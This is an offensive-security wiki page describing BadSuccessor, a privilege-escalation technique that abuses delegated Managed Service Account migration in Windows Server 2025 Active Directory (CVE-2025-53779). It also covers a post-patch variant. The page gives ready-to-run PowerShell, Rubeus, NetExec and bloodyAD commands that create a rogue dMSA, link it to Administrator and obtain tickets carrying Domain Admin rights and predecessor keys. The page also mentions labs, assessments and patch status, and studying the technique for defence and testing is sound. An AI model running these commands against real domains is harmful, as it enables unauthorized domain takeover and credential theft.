# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## Overview

**BadSuccessor** abuses the **delegated Managed Service Account** (**dMSA**) migration workflow introduced in **Windows Server 2025**. A dMSA can be linked to a legacy account through **`msDS-ManagedAccountPrecededByLink`** and moved through the migration states stored in **`msDS-DelegatedMSAState`**. If an attacker can create a dMSA in a writable OU and control those attributes, the KDC can issue tickets for the attacker-controlled dMSA with the **authorization context of the linked account**.<sup>[[2]](#references)</sup>

In practice this means a low-privileged user who only has delegated OU rights can create a new dMSA, point it at `Administrator`, complete the migration state, and then obtain a TGT whose PAC contains privileged groups such as **Domain Admins**.<sup>[[2]](#references)</sup>

## dMSA migration details that matter

- dMSA is a **Windows Server 2025** feature.
- `Start-ADServiceAccountMigration` sets the migration into the **started** state.
- `Complete-ADServiceAccountMigration` sets the migration into the **completed** state.
- `msDS-DelegatedMSAState = 1` means migration started.
- `msDS-DelegatedMSAState = 2` means migration completed.
- During legitimate migration, the dMSA is meant to replace the superseded account transparently, so the KDC/LSA preserve access that the previous account already had.<sup>[[3]](#references)</sup>

Microsoft Learn also notes that during migration the original account is tied to the dMSA and the dMSA is intended to access what the old account could access.<sup>[[3]](#references)</sup> This is the security assumption BadSuccessor abuses.<sup>[[2]](#references)</sup>

## Requirements

1. A domain where **dMSA exists**, which means **Windows Server 2025** support is present on the AD side.
2. The attacker can **create** `msDS-DelegatedManagedServiceAccount` objects in some OU, or has equivalent broad child-object creation rights there.
3. The attacker can **write** the relevant dMSA attributes or fully control the dMSA they just created.
4. The attacker can request Kerberos tickets from a domain-joined context or from a tunnel that reaches LDAP/Kerberos.<sup>[[2]](#references)</sup>

### Practical checks

The cleanest operator signal is to verify the domain/forest level and confirm the environment is already using the new Server 2025 stack:

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

If you see values such as `Windows2025Domain` and `Windows2025Forest`, treat **BadSuccessor / dMSA migration abuse** as a priority check.

You can also enumerate writable OUs delegated for dMSA creation with public tooling:<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Abuse flow

1. Create a dMSA in an OU where you have delegated create-child rights.
2. Set **`msDS-ManagedAccountPrecededByLink`** to the DN of a privileged target such as `CN=Administrator,CN=Users,DC=corp,DC=local`.
3. Set **`msDS-DelegatedMSAState`** to `2` to mark the migration as completed.
4. Request a TGT for the new dMSA and use the returned ticket to access privileged services.<sup>[[2]](#references)</sup>

PowerShell example:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

Ticket request / operational tooling examples:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## Why this is more than privilege escalation

During legitimate migration, Windows also needs the new dMSA to handle tickets that were issued for the previous account before cutover. This is why dMSA-related ticket material can include **current** and **previous** keys in the **`KERB-DMSA-KEY-PACKAGE`** flow.<sup>[[2]](#references)</sup>

For an attacker-controlled fake migration, that behavior can turn BadSuccessor into:<sup>[[2]](#references)</sup>

- **Privilege escalation** by inheriting privileged group SIDs in the PAC.
- **Credential material exposure** because previous-key handling can expose material equivalent to the predecessor's RC4/NT hash in vulnerable workflows.

That makes the technique useful both for direct domain takeover and for follow-on operations such as pass-the-hash or wider credential compromise.

## BetterSuccessor after the KDC patch

The patched KDC validates both sides of a dMSA migration. Besides the dMSA's `msDS-ManagedAccountPrecededByLink` and migration state, the predecessor must point back to the dMSA through `msDS-SupersededManagedAccountLink` and have a compatible `msDS-SupersededServiceAccountState`. A one-way link now fails; an account that can only create a dMSA cannot nominate any arbitrary predecessor. With `CreateChild` for a dMSA in an OU **and** effective write access to the selected target account's migration attributes, an attacker can establish the reciprocal link. The resulting dMSA ticket can carry the predecessor's authorization context and expose its keys in the dMSA key package. This is a targeted credential-access/privilege-amplification path, not proof that the original arbitrary-target BadSuccessor remains exploitable on patched DCs.<sup>[[5]](#references)[[6]](#references)</sup>

In a lab where the target-account write is confirmed, `bloodyAD` can create the dMSA and perform the paired migration writes. Request the dMSA ticket using the returned Kerberos material and check the target account's actual permissions before assuming its privileges or hash were recovered. The tool's `badSuccessor` subcommand name does not imply the unpatched one-way behavior.<sup>[[6]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## Notes on patch status

The original BadSuccessor behavior is **not just a theoretical 2025 preview issue**. Microsoft assigned it **CVE-2025-53779** and published a security update in **August 2025**.<sup>[[4]](#references)</sup> Keep this attack documented for:

- **labs / CTFs / assume-breach exercises**
- **unpatched Windows Server 2025 environments**
- **validation of OU delegations and dMSA exposure during assessments**

Do not assume a Windows Server 2025 domain is vulnerable just because dMSA exists; verify patch level and test carefully.

## Tools

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSA abuse to Domain Admin (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accounts overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Altered Security - BetterSuccessor: Still abusing dMSA after the patch](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [6] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)

{{#include ../../../banners/hacktricks-training.md}}
